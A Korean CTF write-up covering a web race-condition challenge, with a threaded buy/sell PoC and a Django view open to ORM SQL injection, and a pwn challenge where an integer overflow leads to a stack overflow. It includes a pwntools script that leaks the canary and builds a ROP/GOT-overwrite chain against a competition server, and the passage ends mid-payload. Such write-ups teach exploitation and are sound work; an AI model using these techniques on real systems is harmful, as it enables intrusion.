&lt;p&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &amp;#xAD6C;&amp;#xB9E4;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD314;&amp;#xC544;&amp;#xC11C; &amp;#xB3C8;&amp;#xC744; &amp;#xC5BB;&amp;#xACE0; &amp;#xAC00;&amp;#xAC8C;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC758; &amp;#xBCF4;&amp;#xC720; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xC5C6;&amp;#xC560;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; &amp;#xC5BB;&amp;#xC740; &amp;#xB3C8;&amp;#xC73C;&amp;#xB85C; &amp;#xBB3C;&amp;#xAC74;&amp;#xC744; &amp;#xACC4;&amp;#xC18D; &amp;#xC0AC;&amp;#xBA74; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB420;&amp;#xAE4C;&amp;#xC694;? &amp;#xBB3C;&amp;#xAC74;&amp;#xC744; &amp;#xC0B4; &amp;#xB54C; &amp;#xBCF4;&amp;#xC720;&amp;#xD55C; &amp;#xB3C8;&amp;#xC774; &amp;#xCC28;&amp;#xAC10;&amp;#xB418;&amp;#xB294; &amp;#xC2DC;&amp;#xC810;&amp;#xC740; &amp;#xBCF4;&amp;#xC720; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xC5C6;&amp;#xC560;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xCC98;&amp;#xB9AC;&amp;#xB41C; &amp;#xC774;&amp;#xD6C4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xADF8;&amp;#xC804;&amp;#xC5D0; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; n&amp;#xBC88;&amp;#xC758; &amp;#xAD6C;&amp;#xB9E4;&amp;#xC694;&amp;#xCCAD;&amp;#xC5D0;&amp;#xC11C; &amp;#xC794;&amp;#xC561; &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xD1B5;&amp;#xACFC;&amp;#xD558;&amp;#xC5EC; &amp;#xBB3C;&amp;#xD488; &amp;#xBA3C;&amp;#xC800; &amp;#xBC1B;&amp;#xB294;&amp;#xB2E4;&amp;#xBA74; m&amp;#xAC1C;&amp;#xC758; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (0&amp;lt;m&amp;lt;n)&lt;/p&gt;
&lt;p&gt;&amp;#xC774; m&amp;#xAC1C;&amp;#xC758; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xD314;&amp;#xC544; &amp;#xB3C8;&amp;#xC744; &amp;#xB9CE;&amp;#xC774; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC11C; flag&amp;#xB97C; &amp;#xC0AC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#PoC&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; idx &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(init_idx, init_idx+&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;):
    t = threading.Thread(target=sell, args=(idx,))
    t.start()
    t.join()
    t1 = threading.Thread(target=buy , args = ())
    t2 = threading.Thread(target=buy , args = ())
    t1.start()
    t2.start()
    t1.join()
    t2.join()

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; idx &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(init_idx, init_idx+&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;):
    sell(idx)
buy_flag()
get_flag()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;CTF&amp;#xAC00; &amp;#xB05D;&amp;#xB098;&amp;#xACE0; &amp;#xCD9C;&amp;#xC81C;&amp;#xC790;&amp;#xC758; &amp;#xD480;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xC804; EmailValidator&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC600;&amp;#xB358; redos &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; race condition&amp;#xC744; &amp;#xC870;&amp;#xAE08; &amp;#xB354; &amp;#xD3B8;&amp;#xD558;&amp;#xAC8C; &amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC5FC;&amp;#xB450;&amp;#xD558;&amp;#xACE0; &amp;#xB0C8;&amp;#xB2E4;&amp;#xB294; &amp;#xC810;&amp;#xC744; &amp;#xC54C;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xB370;&amp;#xC694;. &amp;#xC800;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC600;&amp;#xB358; ORM &amp;#xCC98;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; sqli &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC5D0; &amp;#xB300;&amp;#xBD80;&amp;#xBD84; &amp;#xC2DC;&amp;#xAC04;&amp;#xC744; &amp;#xD560;&amp;#xC560;&amp;#xD558;&amp;#xC5EC; &amp;#xACB0;&amp;#xAD6D; &amp;#xC815;&amp;#xADDC;&amp;#xC2DC;&amp;#xAC04; &amp;#xB0B4;&amp;#xC5D0;&amp;#xB294; &amp;#xD480;&amp;#xC9C0; &amp;#xBABB;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;(&lt;del&gt;&amp;#xCD9C;&amp;#xC81C;&amp;#xC790;&amp;#xAC00; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD568;&amp;#xC815;&amp;#xC744; &amp;#xD30C;&amp;#xB450;&amp;#xC5C8;&amp;#xAC70;&amp;#xB4E0;&amp;#xC694;&lt;/del&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;VerySuspiciousView&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;View&lt;/span&gt;):&lt;/span&gt;
    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, request&lt;/span&gt;):&lt;/span&gt;
        field = request.GET.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;field&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)
        value = request.GET.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)

        len(
            ProductModel.objects.annotate(**{field: Value(value)})
        )

        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; HttpResponse(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;CCE&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xADF8;&amp;#xB807;&amp;#xACE0; race condition&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xC870;&amp;#xAE08; &amp;#xB354; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574;&amp;#xBCF4;&amp;#xAC8C; &amp;#xB41C; &amp;#xBB38;&amp;#xC81C;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Horcrux2-pwndorei&#34;&gt;&lt;a href=&#34;#Horcrux2-pwndorei&#34; class=&#34;headerlink&#34; title=&#34;Horcrux2 - pwndorei&#34;&gt;&lt;/a&gt;Horcrux2 - pwndorei&lt;/h2&gt;&lt;h3 id=&#34;Analysis&#34;&gt;&lt;a href=&#34;#Analysis&#34; class=&#34;headerlink&#34; title=&#34;Analysis&#34;&gt;&lt;/a&gt;Analysis&lt;/h3&gt;&lt;p&gt;&amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xB294; &lt;code&gt;main&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; Integer Overflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;BreakHorcrux&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; Stack Buffer Overflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Stack BOF&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD574;&amp;#xB3C4; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xAC00; &amp;#xC801;&amp;#xC6A9;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774;&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xACE0; PIE&amp;#xAC00; &amp;#xC801;&amp;#xC6A9;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC810;, Partial RELRO&amp;#xC778; &amp;#xC810;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; ROP&amp;#xB85C; GOT overwrite&amp;#xB97C; &amp;#xD574;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xBA3C;&amp;#xC800; &amp;#xBCF4;&amp;#xC790;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 &lt;span class=&#34;hljs-title&#34;&gt;DrinkPotion&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  __int64 result; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; amount; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+0h] [rbp-10h] BYREF&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+4h] [rbp-Ch]&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64 v3; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;

  v3 = __readfsqword(&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;u);
  v2 = &lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;;
  &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;How much will you drink? &amp;gt;&amp;gt;&amp;gt; &amp;quot;&lt;/span&gt;);
  __isoc99_scanf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;amount);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( amount &amp;lt;= &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt; )
  {
    v2 += amount;                               
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x80000000&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )               &lt;span class=&#34;hljs-comment&#34;&gt;// no negative number&lt;/span&gt;
      BreakHorcrux(v2);
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;You&amp;apos;re out of HP. You&amp;apos;re dead.&amp;quot;&lt;/span&gt;);
    result = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;You drank too much. You&amp;apos;re poisoned to death.&amp;quot;&lt;/span&gt;);
    result = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;amount&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;scanf&lt;/code&gt;&amp;#xB85C; &amp;#xC815;&amp;#xC218; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC785;&amp;#xB825; &amp;#xBC1B;&amp;#xACE0; &lt;code&gt;BreakHorcrux&lt;/code&gt;&amp;#xC5D0; &amp;#xC804;&amp;#xB2EC;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;v2&lt;/code&gt;&amp;#xB294; -1&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;amount&lt;/code&gt;&amp;#xAC00; 40&amp;#xBCF4;&amp;#xB2E4; &amp;#xD06C;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBA74; if &amp;#xBB38;&amp;#xC758; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;v2&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;amount&lt;/code&gt;&amp;#xB97C; &amp;#xB354;&amp;#xD558;&amp;#xACE0; &lt;code&gt;v2&lt;/code&gt;&amp;#xAC00; &amp;#xC74C;&amp;#xC218;&amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &lt;code&gt;BreakHorcrux&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; amount&amp;#xB97C; &lt;code&gt;%d&lt;/code&gt;&amp;#xB85C; &amp;#xC785;&amp;#xB825; &amp;#xBC1B;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC74C;&amp;#xC218;&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; int &amp;#xC790;&amp;#xB8CC;&amp;#xD615;&amp;#xC758; &amp;#xCD5C;&amp;#xC19F;&amp;#xAC12;&amp;#xC744; &amp;#xC785;&amp;#xB825;&amp;#xD558;&amp;#xBA74; -1&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;v2&lt;/code&gt;&amp;#xC640; &amp;#xB354;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; Integer Overflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD574; &lt;code&gt;v2&lt;/code&gt;&amp;#xB294; int &amp;#xC790;&amp;#xB8CC;&amp;#xD615;&amp;#xC758; &amp;#xCD5C;&amp;#xB313;&amp;#xAC12;&amp;#xC774; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;BreakHorcrux&lt;/code&gt;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ssize_t&lt;/span&gt; __fastcall &lt;span class=&#34;hljs-title&#34;&gt;BreakHorcrux&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; potion_cnt)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  __int64 buf[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;]; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+10h] [rbp-30h] BYREF&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64 canary; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+38h] [rbp-8h]&lt;/span&gt;

  canary = __readfsqword(&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;u);
  buf[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  write(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;First Chance: &amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xE&lt;/span&gt;uLL);
  read(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, buf, potion_cnt);
  &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s is not a password.\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)buf);
  write(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Second Chance: &amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xF&lt;/span&gt;uLL);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; read(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, buf, potion_cnt);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xC758; Integer Overflow&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;potion_cnt&lt;/code&gt;&amp;#xC5D0; int &amp;#xCD5C;&amp;#xB313;&amp;#xAC12;&amp;#xC744; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xBA74; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; 40&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC778; &lt;code&gt;buf&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; stack bof&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;read&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;buf&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;potion_cnt&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &amp;#xCD1D; &amp;#xB450; &amp;#xBC88; &amp;#xC785;&amp;#xB825;&amp;#xC744; &amp;#xBC1B;&amp;#xB294;&amp;#xB370; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC785;&amp;#xB825;&amp;#xC740; &lt;code&gt;buf&lt;/code&gt;&amp;#xB97C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xB85C; &amp;#xCD9C;&amp;#xB825;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC785;&amp;#xB825;&amp;#xC5D0;&amp;#xC11C; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xC758; &amp;#xCCAB; &amp;#xB110; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xB2E4;&amp;#xB978; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xB0B4;&amp;#xACE0; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC785;&amp;#xB825;&amp;#xC5D0;&amp;#xC11C; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB41C; ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0BD;&amp;#xC785;&amp;#xD574; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *

context.log_level = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;debug&amp;apos;&lt;/span&gt;

elf = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./horcrux2&amp;quot;&lt;/span&gt;)
libc = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./libc-2.27.so&amp;quot;&lt;/span&gt;)
&lt;span class=&#34;hljs-comment&#34;&gt;#libc = elf.libc&lt;/span&gt;

&lt;span class=&#34;hljs-comment&#34;&gt;#p = process(&amp;quot;./horcrux2&amp;quot;)&lt;/span&gt;
p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;15.165.100.234&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;32859&lt;/span&gt;)

int_overflow = &lt;span class=&#34;hljs-number&#34;&gt;-2147483648&lt;/span&gt;

p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;&amp;gt;&amp;gt;&amp;quot;&lt;/span&gt;, str(int_overflow).encode())

p.sendline(cyclic(&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, n=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;))

p.recvuntil(cyclic(&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, n=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)+&lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;\n&amp;apos;&lt;/span&gt;)

canary = u64(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;\x00&amp;apos;&lt;/span&gt;+p.recv(&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;))

print(hex(canary))

payload = cyclic(&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, n=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(canary) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;

&lt;span class=&#34;hljs-comment&#34;&gt;#ROP&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;#gadgets&lt;/span&gt;
pop_rdi = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x0000000000400ab3&lt;/span&gt;)
pop_rsi_r15 = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x0000000000400ab1&lt;/span&gt;)
pop_rdx = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x00000000004008af&lt;/span&gt;)
ret = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x0000000000400696&lt;/span&gt;)

payload += pop_rdi + p64(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) + pop_rsi_r15 + p64(elf.got[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;]) + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rdx + p64(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# write(1, write@got, 8)&lt;/span&gt;
payload += pop_rdi + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rsi_r15 + p64(elf.got[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;]) + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rdx + p64(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;read&amp;apos;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# read(0, write@got, 8)&lt;/span&gt;
payload += pop_rdi + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rsi_r15 + p64(elf.bss()) + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rdx + p64(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;read&amp;apos;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# read(0, bss, 8)&lt;/span&gt;
